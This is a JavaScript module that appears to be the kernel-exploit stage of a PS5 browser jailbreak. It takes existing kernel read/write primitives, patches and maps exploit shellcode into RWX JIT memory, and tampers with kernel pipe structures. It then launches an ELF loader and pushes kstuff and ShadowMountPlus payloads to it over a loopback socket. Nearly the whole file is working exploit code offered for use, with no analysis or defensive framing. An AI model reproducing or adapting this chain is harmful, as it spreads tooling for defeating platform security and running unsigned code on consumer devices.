import { int64 } from "./utils/int64.js";

const O_NONBLOCK = 0x4;
const PROT_RW = 0x3, PROT_RWX = 0x7;
const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;

/*
 * PS5 / FreeBSD syscalls
 */
const SYS_READ = 0x03;
const SYS_WRITE = 0x04;
const SYS_CLOSE = 0x06;
const SYS_SOCKET = 0x61;
const SYS_CONNECT = 0x62;
const SYS_MMAP = 0x47;
const SYS_MUNMAP = 0x49;
const SYS_PIPE2 = 0x2af;
const SYS_JITSHM_CREATE = 0x2c2;
const SYS_JITSHM_ALIAS = 0x2c3;

/*
 * Network constants used for the local TCP connection to elfldr.
 */
const AF_INET = 0x2;
const SOCK_STREAM = 0x1;
const ELFLDR_PORT = 9021;
const ELFLDR_LOOPBACK = 0x0100007f; // 127.0.0.1 in little-endian memory

/*
 * Files
 */
const DEFAULT_KEXP = "kexp_2026_05_25.bin";
const DEFAULT_ELFLDR = "elfldr-ps5-1360.elf";

const DEFAULT_POST_PAYLOADS = [
  {
    name: "kstuff.elf",
    waitAfterMs: 3000,
  },
  {
    name: "shadowmountplus.elf",
    waitAfterMs: 1000,
  },
];

const SHELLCODE = {
  size: 18912,

  resolverCalls: [
    [0x1c, [0xe8, 0xcf, 0x00, 0x00, 0x00]],
    [0x23, [0xe8, 0x78, 0x01, 0x00, 0x00]],
  ],

  getpid: {
    at: 0x10f1,
    bytes: [
      0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
      0x48, 0x8d, 0x55, 0xd0, 0xbf, 0x01, 0x20, 0x00, 0x00,
      0xe8, 0x41, 0x2b, 0x00, 0x00,
    ],
    tail: [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0],
    tailAt: 0x10fb,
    padFrom: 0x1101,
    padTo: 0x1106,
  },

  logCalls: [0x126d, 0x12ad, 0x3bc2],

  imports: {
    libkernel: {
      sceKernelSendNotificationRequest: 0x48b0,
      sysctlbyname: 0x48b8,
      pthread_create: 0x48c0,
      pthread_join: 0x48c8,
    },

    libc: {
      malloc: 0x48d0,
      free: 0x48d8,
      memcpy: 0x48e0,
      memset: 0x48e8,
      strcmp: 0x48f0,
      memcmp: 0x48f8,
      vsnprintf: 0x4900,
    },
  },
};

const PIPE = {
  count: 0x00,
  in: 0x04,
  out: 0x08,
  size: 0x0c,
  buffer: 0x10,
  defaultSize: 0x4000,
};

const FD_ENTRY = {
  ofiles: 0x08,
  stride: 0x30,
  data: 0x00,
};

function readU32(bytes, offset) {
  return (
    bytes[offset] |
    (bytes[offset + 1] << 8) |
    (bytes[offset + 2] << 16) |
    (bytes[offset + 3] << 24)
  ) >>> 0;
}

function writeU64(bytes, offset, value) {
  let rest = BigInt(value) & 0xffffffffffffffffn;

  for (let i = 0; i < 8; i++) {
    bytes[offset + i] = Number(rest & 0xffn);
    rest >>= 8n;
  }
}

function matches(bytes, offset, expected) {
  return expected.every(
    (byte, index) => bytes[offset + index] === byte
  );
}

function hex(value) {
  return (
    "0x" +
    (
      value instanceof int64
        ? value.toString(16)
        : (Number(value) >>> 0).toString(16)
    )
  );
}

/*
 * Small async delay used between payloads and while waiting for elfldr.
 */
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/*
 * Check if an int64 syscall return value represents -1.
 */
function syscallFailed(value) {
  return (value.low >>> 0) === 0xffffffff;
}

/*
 * Copy a Uint8Array into PS5 memory.
 */
function copyBytesToMemory(p, destination, bytes) {
  const dwords = bytes.length & ~3;

  for (let offset = 0; offset < dwords; offset += 4) {
    p.write4(
      destination.add32(offset),
      readU32(bytes, offset)
    );
  }

  for (let offset = dwords; offset < bytes.length; offset++) {
    p.write1(
      destination.add32(offset),
      bytes[offset]
    );
  }
}

/*
 * Resolve the symbols required by the shellcode.
 */
function resolveSymbols(p) {
  const tables = window.SYMBOLS || {};

  const bases = {
    libkernel: p.libKernelBase,
    libc: p.libSceLibcInternalBase,
  };

  const resolved = {};

  for (const [group, imports] of Object.entries(SHELLCODE.imports)) {
    const base = bases[group];
    const offsets = tables[group];

    if (!base || (base.low === 0 && base.hi === 0)) {
      throw new Error(
        "kexp: " + group + " base is unresolved"
      );
    }

    if (!offsets) {
      throw new Error(
        "kexp: " + group + " symbols are missing"
      );
    }

    const names = Object.keys(imports);

    if (group === "libkernel") {
      names.push("getpid");
    }

    const missing = names.filter(
      (name) => typeof offsets[name] !== "number"
    );

    if (missing.length) {
      throw new Error(
        "kexp: " +
        group +
        " is missing " +
        missing.join(", ")
      );
    }

    resolved[group] = {
      base,
      offsets,
    };
  }

  return resolved;
}

/*
 * Load a binary from the local payloads directory.
 *
 * This is only used to obtain the binary inside the browser.
 * The PS5 payload itself is NOT fetched using HTTP/HTTPS.
 */
async function fetchBinary(name) {
  const response = await fetch("payloads/" + name, {
    cache: "no-store",
  });

  if (!response.ok) {
    throw new Error(
      "kexp: " +
      name +
      " returned HTTP " +
      response.status
    );
  }

  return new Uint8Array(
    await response.arrayBuffer()
  );
}

/*
 * Load the raw ELF blob into an RW mapping.
 *
 * This is used by the kexp shellcode because shellcode itself
 * receives the address and size of elfldr.
 */
async function mapElf(name, p, chain) {
  const elf = await fetchBinary(name);

  if (
    elf.length < 0x1000 ||
    readU32(elf, 0) !== 0x464c457f
  ) {
    throw new Error(
      "kexp: " + name + " is not an ELF"
    );
  }

  const size =
    (elf.length + 0x3fff) & ~0x3fff;

  const base = await chain.syscall(
    SYS_MMAP,
    0,
    size,
    PROT_RW,
    MAP_PRIVATE_ANON,
    -1,
    0
  );

  if (
    base.low >>> 0 === 0xffffffff ||
    base.low < 0x10000
  ) {
    throw new Error(
      "kexp: " +
      name +
      " mmap failed"
    );
  }

  copyBytesToMemory(p, base, elf);

  if (
    p.read4(base) >>> 0 !== 0x464c457f
  ) {
    throw new Error(
      "kexp: " +
      name +
      " copy failed"
    );
  }

  return {
    base,
    size: elf.length,
  };
}

/*
 * Patch the kexp shellcode.
 */
function patchShellcode(blob, symbols) {
  if (blob.length !== SHELLCODE.size) {
    throw new Error(
      "kexp: expected " +
      SHELLCODE.size +
      " bytes, got " +
      blob.length
    );
  }

  if (
    SHELLCODE.resolverCalls.some(
      ([offset, bytes]) =>
        !matches(blob, offset, bytes)
    ) ||
    !matches(
      blob,
      SHELLCODE.getpid.at,
      SHELLCODE.getpid.bytes
    )
  ) {
    throw new Error(
      "kexp: shellcode signature does not match"
    );
  }

  for (
    const [offset]
    of SHELLCODE.resolverCalls
  ) {
    for (let i = 0; i < 5; i++) {
      blob[offset + i] = 0x90;
    }
  }

  const addressOf = (group, name) => {
    const {
      base,
      offsets,
    } = symbols[group];

    return (
      (BigInt(base.hi) << 32n) +
      BigInt(base.low >>> 0) +
      BigInt(offsets[name])
    );
  };

  for (
    const [group, imports]
    of Object.entries(SHELLCODE.imports)
  ) {
    for (
      const [name, offset]
      of Object.entries(imports)
    ) {
      writeU64(
        blob,
        offset,
        addressOf(group, name)
      );
    }
  }

  const {
    at,
    tail,
    tailAt,
    padFrom,
    padTo,
  } = SHELLCODE.getpid;

  blob[at] = 0x48;
  blob[at + 1] = 0xb8;

  writeU64(
    blob,
    at + 2,
    addressOf("libkernel", "getpid")
  );

  tail.forEach(
    (byte, index) => {
      blob[tailAt + index] = byte;
    }
  );

  for (
    let i = padFrom;
    i < padTo;
    i++
  ) {
    blob[i] = 0x90;
  }

  for (
    const offset
    of SHELLCODE.logCalls
  ) {
    if (blob[offset] === 0xe8) {
      for (let i = 0; i < 5; i++) {
        blob[offset + i] = 0x90;
      }
    }
  }
}

/*
 * Map executable shellcode into JIT shared memory.
 */
async function mapExecutable(blob, p, chain) {
  const length =
    (blob.length + 0x3fff) & ~0x3fff;

  const failed = (value) =>
    value.low >>> 0 === 0xffffffff;

  const copyInto = (destination) => {
    const dwords =
      blob.length & ~3;

    for (
      let offset = 0;
      offset < dwords;
      offset += 4
    ) {
      p.write4(
        destination.add32(offset),
        readU32(blob, offset)
      );
    }

    for (
      let offset = dwords;
      offset < blob.length;
      offset++
    ) {
      p.write1(
        destination.add32(offset),
        blob[offset]
      );
    }

    for (
      let offset = 0;
      offset < dwords;
      offset += 4
    ) {
      if (
        p.read4(
          destination.add32(offset)
        ) >>> 0 !==
        readU32(blob, offset)
      ) {
        return false;
      }
    }

    return true;
  };

  const execFd =
    await chain.syscall(
      SYS_JITSHM_CREATE,
      0,
      length,
      PROT_RWX
    );

  if (
    failed(execFd) ||
    execFd.low >= 0x100000
  ) {
    throw new Error(
      "kexp: jitshm_create failed (" +
      hex(execFd) +
      ")"
    );
  }

  const entry =
    await chain.syscall(
      SYS_MMAP,
      0,
      length,
      PROT_RWX,
      MAP_SHARED,
      execFd,
      0
    );

  if (
    failed(entry) ||
    entry.low < 0x10000
  ) {
    throw new Error(
      "kexp: executable mmap failed (" +
      hex(entry) +
      ")"
    );
  }

  if (!copyInto(entry)) {
    const writeFd =
      await chain.syscall(
        SYS_JITSHM_ALIAS,
        execFd,
        PROT_RW
      );

    if (
      failed(writeFd) ||
      writeFd.low >= 0x100000
    ) {
      throw new Error(
        "kexp: writable jitshm alias failed"
      );
    }

    const writable =
      await chain.syscall(
        SYS_MMAP,
        0,
        length,
        PROT_RW,
        MAP_SHARED,
        writeFd,
        0
      );

    if (
      failed(writable) ||
      writable.low < 0x10000
    ) {
      throw new Error(
        "kexp: writable mmap failed (" +
        hex(writable) +
        ")"
      );
    }

    if (
      !copyInto(writable) ||
      p.read4(entry) >>> 0 !==
      readU32(blob, 0)
    ) {
      throw new Error(
        "kexp: shellcode copy failed"
      );
    }

    await chain.syscall(
      SYS_MUNMAP,
      writable,
      length
    );
  }

  return entry;
}

/*
 * Create one non-blocking pipe pair.
 */
async function makePipePair(p, chain) {
  const fds = p.malloc(8, 1);

  const rv =
    await chain.syscall(
      SYS_PIPE2,
      fds,
      O_NONBLOCK
    );

  const result =
    rv.low | 0;

  if (result < 0) {
    throw new Error(
      "kexp: pipe2 failed (" +
      result +
      ")"
    );
  }

  const readFd =
    p.read4(fds) >>> 0;

  const writeFd =
    p.read4(
      fds.add32(4)
    ) >>> 0;

  if (
    !readFd ||
    !writeFd ||
    readFd >= 0x100000 ||
    writeFd >= 0x100000
  ) {
    throw new Error(
      "kexp: invalid pipe fds " +
      readFd +
      "/" +
      writeFd
    );
  }

  return {
    readFd,
    writeFd,
  };
}

/*
 * Prepare the overlapping pipe structures used by the shellcode.
 */
async function prepareShellcodePipes(
  krw,
  master,
  victim
) {
  const table =
    await krw.read8(
      krw.procFdAddr
    );

  const pipeOf = async (fd) => {
    const file =
      await krw.read8(
        table.add32(
          FD_ENTRY.ofiles +
          fd * FD_ENTRY.stride
        )
      );

    return krw.read8(
      file.add32(
        FD_ENTRY.data
      )
    );
  };

  const masterPipe =
    await pipeOf(
      master.readFd
    );

  const victimPipe =
    await pipeOf(
      victim.readFd
    );

  await krw.write4(
    masterPipe.add32(
      PIPE.count
    ),
    0
  );

  await krw.write4(
    masterPipe.add32(
      PIPE.in
    ),
    0
  );

  await krw.write4(
    masterPipe.add32(
      PIPE.out
    ),
    0
  );

  await krw.write4(
    masterPipe.add32(
      PIPE.size
    ),
    PIPE.defaultSize
  );

  await krw.write8(
    masterPipe.add32(
      PIPE.buffer
    ),
    victimPipe
  );

  const readBack =
    await krw.read8(
      masterPipe.add32(
        PIPE.buffer
      )
    );

  if (
    readBack.low !== victimPipe.low ||
    readBack.hi !== victimPipe.hi
  ) {
    throw new Error(
      "kexp: pipe bootstrap failed"
    );
  }
}

/*
 * Start the shellcode as a pthread and wait for it.
 */
async function spawnAndJoin(
  entry,
  args,
  symbols,
  p,
  chain
) {
  const {
    base,
    offsets,
  } = symbols.libkernel;

  const create =
    offsets.pthread_create_name_np === undefined
      ? offsets.pthread_create
      : offsets.pthread_create_name_np;

  const handle =
    p.malloc(8);

  const result =
    p.malloc(8);

  p.write8(handle, 0);
  p.write8(result, 0);

  const created =
    await chain.call(
      base.add32(create),
      handle,
      new int64(0, 0),
      entry,
      args,
      p.stringify("payload")
    );

  if (
    created.low >>> 0 !== 0
  ) {
    throw new Error(
      "kexp: pthread_create returned " +
      hex(created)
    );
  }

  const joined =
    await chain.call(
      base.add32(
        offsets.pthread_join
      ),
      p.read8(handle),
      result
    );

  return {
    joinResult:
      joined.low >>> 0,

    shellcodeResult:
      p.read8(result),
  };
}

/*
 * ------------------------------------------------------------------------
 * Raw TCP ELF sender for elfldr.
 *
 * IMPORTANT:
 *
 * This does NOT use:
 *
 *   http://127.0.0.1:9021
 *   https://127.0.0.1:9021
 *   ?uri=
 *
 * Instead it creates a real TCP socket with SYS_socket(),
 * connects to 127.0.0.1:9021 using SYS_connect(),
 * and writes the ELF bytes using SYS_write().
 *
 * elfldr accepts raw ELF payloads directly on port 9021.
 * ------------------------------------------------------------------------
 */

/*
 * Build a FreeBSD sockaddr_in for 127.0.0.1:9021.
 *
 * struct sockaddr_in is 16 bytes:
 *
 * +0  sin_len
 * +1  sin_family
 * +2  sin_port
 * +4  sin_addr
 * +8  zero padding
 */
function makeElfldrSockaddr(p) {
  const sockaddr =
    p.malloc(16, 1);

  for (let i = 0; i < 16; i++) {
    p.write1(
      sockaddr.add32(i),
      0
    );
  }

  /*
   * FreeBSD sockaddr header.
   */
  p.write1(
    sockaddr,
    16
  );

  p.write1(
    sockaddr.add32(1),
    AF_INET
  );

  /*
   * htons(9021)
   *
   * 9021 decimal = 0x233d.
   * Network order bytes = 23 3d.
   */
  p.write1(
    sockaddr.add32(2),
    0x23
  );

  p.write1(
    sockaddr.add32(3),
    0x3d
  );

  /*
   * 127.0.0.1
   */
  p.write4(
    sockaddr.add32(4),
    ELFLDR_LOOPBACK
  );

  return sockaddr;
}

/*
 * Connect to elfldr.
 *
 * elfldr may need a moment after the kexp bootstrap,
 * therefore connection is retried instead of assuming
 * that port 9021 is immediately available.
 */
async function connectToElfldr(
  p,
  chain,
  log
) {
  const say =
    typeof log === "function"
      ? log
      : () => {};

  const maxAttempts = 20;
  const retryDelayMs = 250;

  for (
    let attempt = 1;
    attempt <= maxAttempts;
    attempt++
  ) {
    let fd = null;

    try {
      const socket =
        await chain.syscall(
          SYS_SOCKET,
          AF_INET,
          SOCK_STREAM,
          0
        );

      if (
        syscallFailed(socket) ||
        socket.low >= 0x100000
      ) {
        throw new Error(
          "socket failed (" +
          hex(socket) +
          ")"
        );
      }

      fd =
        socket.low >>> 0;

      const sockaddr =
        makeElfldrSockaddr(p);

      const connected =
        await chain.syscall(
          SYS_CONNECT,
          fd,
          sockaddr,
          16
        );

      if (!syscallFailed(connected)) {
        say(
          "connected to elfldr on 127.0.0.1:" +
          ELFLDR_PORT
        );

        return fd;
      }

      /*
       * Connection failed.
       * Close this socket before trying again.
       */
      await chain.syscall(
        SYS_CLOSE,
        fd
      );

      fd = null;
    } catch (error) {
      if (fd !== null) {
        try {
          await chain.syscall(
            SYS_CLOSE,
            fd
          );
        } catch (_) {
          /*
           * Ignore secondary close errors.
           */
        }
      }

      if (
        attempt === maxAttempts
      ) {
        throw error;
      }
    }

    if (
      attempt < maxAttempts
    ) {
      await sleep(
        retryDelayMs
      );
    }
  }

  throw new Error(
    "kexp: elfldr did not become available on port " +
    ELFLDR_PORT
  );
}

/*
 * Send one raw ELF to elfldr over TCP.
 */
async function sendRawElfToElfldr(
  name,
  p,
  chain,
  log
) {
  const say =
    typeof log === "function"
      ? log
      : () => {};

  say(
    "loading " +
    name +
    "..."
  );

  /*
   * Read the local binary.
   *
   * The PS5 is NOT downloading this file here.
   * The bytes are brought into the current JS process first.
   */
  const elf =
    await fetchBinary(name);

  /*
   * Validate ELF magic before touching the socket.
   */
  if (
    elf.length < 4 ||
    readU32(elf, 0) !== 0x464c457f
  ) {
    throw new Error(
      "kexp: " +
      name +
      " is not a valid ELF payload"
    );
  }

  say(
    name +
    " size: " +
    elf.length +
    " bytes"
  );

  /*
   * Allocate memory accessible to the syscall chain.
   */
  const buffer =
    p.malloc(
      elf.length,
      1
    );

  copyBytesToMemory(
    p,
    buffer,
    elf
  );

  /*
   * Verify the first bytes after copying.
   */
  if (
    p.read4(buffer) >>> 0 !==
    0x464c457f
  ) {
    throw new Error(
      "kexp: failed to copy " +
      name
    );
  }

  const fd =
    await connectToElfldr(
      p,
      chain,
      say
    );

  try {
    let sent = 0;

    /*
     * Do not assume one write() sends the whole ELF.
     * TCP writes are allowed to be partial.
     *
     * 0x10000 keeps each syscall comfortably sized.
     */
    const maxChunk =
      0x10000;

    while (
      sent < elf.length
    ) {
      const remaining =
        elf.length - sent;

      const chunk =
        Math.min(
          remaining,
          maxChunk
        );

      const written =
        await chain.syscall(
          SYS_WRITE,
          fd,
          buffer.add32(sent),
          chunk
        );

      if (
        syscallFailed(written)
      ) {
        throw new Error(
          "kexp: write failed while sending " +
          name +
          " at offset 0x" +
          sent.toString(16)
        );
      }

      const count =
        written.low | 0;

      if (
        count <= 0
      ) {
        throw new Error(
          "kexp: elfldr write returned " +
          count +
          " while sending " +
          name
        );
      }

      sent += count;
    }

    say(
      name +
      " sent to elfldr (" +
      sent +
      " bytes)"
    );
  } finally {
    /*
     * Closing the socket tells elfldr that the payload
     * stream is finished.
     */
    await chain.syscall(
      SYS_CLOSE,
      fd
    );
  }

  return true;
}

/*
 * Run the additional payloads after elfldr has been bootstrapped.
 *
 * Required order:
 *
 *   1. kstuff.elf
 *   2. shadowmountplus.elf
 */
async function runPostKexpPayloads(
  p,
  chain,
  log
) {
  const say =
    typeof log === "function"
      ? log
      : () => {};

  for (
    const payload
    of DEFAULT_POST_PAYLOADS
  ) {
    await sendRawElfToElfldr(
      payload.name,
      p,
      chain,
      say
    );

    if (
      payload.waitAfterMs > 0
    ) {
      say(
        "waiting " +
        payload.waitAfterMs +
        " ms after " +
        payload.name +
        "..."
      );

      await sleep(
        payload.waitAfterMs
      );
    }
  }

  say(
    "kstuff + shadowmountplus payload chain completed"
  );
}

/*
 * ------------------------------------------------------------------------
 * Main kexp entry point
 * ------------------------------------------------------------------------
 */
export async function runKexp(
  krw,
  p,
  chain,
  log
) {
  const say =
    typeof log === "function"
      ? log
      : () => {};

  const allprocRva =
    window.KRW &&
    window.KRW.allproc;

  if (
    !krw ||
    !krw.ktextBase ||
    !krw.procFdAddr
  ) {
    throw new Error(
      "kexp: kernel R/W is incomplete"
    );
  }

  if (
    typeof allprocRva !== "number"
  ) {
    throw new Error(
      "kexp: allproc is missing for this firmware"
    );
  }

  const allproc =
    krw.ktextBase.add32(
      allprocRva
    );

  if (
    (
      allproc.hi &
      0xffff0000
    ) >>> 0 !==
    0xffff0000
  ) {
    throw new Error(
      "kexp: invalid allproc address " +
      hex(allproc)
    );
  }

  /*
   * Resolve the symbols required by the shellcode.
   */
  const symbols =
    resolveSymbols(p);

  /*
   * Stage 1:
   *
   * Map elfldr itself.
   */
  say(
    "mapping " +
    DEFAULT_ELFLDR +
    "..."
  );

  const elfldr =
    await mapElf(
      DEFAULT_ELFLDR,
      p,
      chain
    );

  say(
    DEFAULT_ELFLDR +
    " mapped"
  );

  /*
   * Stage 2:
   *
   * Load and patch kexp shellcode.
   */
  say(
    "loading " +
    DEFAULT_KEXP +
    "..."
  );

  const blob =
    await fetchBinary(
      DEFAULT_KEXP
    );

  patchShellcode(
    blob,
    symbols
  );

  const entry =
    await mapExecutable(
      blob,
      p,
      chain
    );

  say(
    "kexp shellcode mapped"
  );

  /*
   * Create the kernel R/W pipe pair.
   */
  const master =
    await makePipePair(
      p,
      chain
    );

  const victim =
    await makePipePair(
      p,
      chain
    );

  await prepareShellcodePipes(
    krw,
    master,
    victim
  );

  /*
   * Arguments consumed by the kexp shellcode.
   */
  const args =
    p.malloc(0x28);

  for (
    let offset = 0;
    offset < 0x28;
    offset += 8
  ) {
    p.write8(
      args.add32(offset),
      0
    );
  }

  p.write4(
    args.add32(0x00),
    master.readFd
  );

  p.write4(
    args.add32(0x04),
    master.writeFd
  );

  p.write4(
    args.add32(0x08),
    victim.readFd
  );

  p.write4(
    args.add32(0x0c),
    victim.writeFd
  );

  p.write8(
    args.add32(0x10),
    allproc
  );

  p.write8(
    args.add32(0x18),
    elfldr.base
  );

  p.write8(
    args.add32(0x20),
    elfldr.size
  );

  /*
   * Stage 3:
   *
   * Execute the patched kexp shellcode.
   *
   * The shellcode bootstraps elfldr.
   */
  say(
    "starting kexp / elfldr..."
  );

  const result =
    await spawnAndJoin(
      entry,
      args,
      symbols,
      p,
      chain
    );

  if (
    result.joinResult !== 0
  ) {
    throw new Error(
      "kexp: pthread_join returned " +
      hex(result.joinResult)
    );
  }

  say(
    "elfldr returned " +
    hex(result.shellcodeResult)
  );

  /*
   * Stage 4:
   *
   * elfldr is now expected to be listening on TCP 9021.
   *
   * No HTTP request is made to port 9021.
   *
   * We use:
   *
   *   socket()
   *   connect(127.0.0.1:9021)
   *   write(ELF)
   *   close()
   *
   * First kstuff, then ShadowMountPlus.
   */
  say(
    "elfldr bootstrap complete"
  );

  await runPostKexpPayloads(
    p,
    chain,
    say
  );

  say(
    "all payloads started successfully"
  );

  return true;
}
